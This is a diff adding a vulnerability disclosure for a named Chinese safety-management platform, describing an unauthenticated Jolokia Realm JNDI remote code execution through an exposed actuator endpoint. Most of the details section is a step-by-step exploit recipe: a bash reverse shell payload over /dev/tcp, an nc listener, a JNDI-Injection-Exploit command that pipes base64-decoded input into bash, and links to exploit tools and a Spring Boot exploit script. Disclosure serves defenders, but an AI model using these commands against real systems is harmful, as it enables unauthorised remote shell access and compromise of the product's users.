@@ -1,0 +1,31 @@
+[PRODUCT]
+双重预防机制管理平台
+Website：https://www.hairongtec.com/about?lang=en
+
+ 
+[TYPE]
+RCE
+[DESCRIPTION]
+A jolokia Realm JNDI RCE vulnerability exists in the " 双重预防机制管理平台". This vulnerability can be triggered without authentication and lead to system privilege escalation, posing significant risks.
+[DETAILS]
+The system's API ’ api/prevention/actuator/jolokia/list ‘ exposes sensitive information
+ 
+1.	Detected Jolokia Realm JNDI RCE vulnerability
+
+2.	Reverse shell payload:
+bash -c 'exec bash -i &>/dev/tcp/ip/port <&1'
+
+3.	Listener command:
+nc -lnvp port
+
+4.	Exploit tool:
+https://github.com/Zard-ethan/JNDI-Injection-Exploit-1.0-SNAPSHOT-all
+
+5.	Payload encoding reference:
+https://www.jackson-t.ca/runtime-exec-payloads.html
+6.	start：java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,ZGly}|{base64,-d}|{bash,-i}" -A ip
+7.	use exp：https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-realm-jndi-rce.py
+
+ 
+ 
+ 
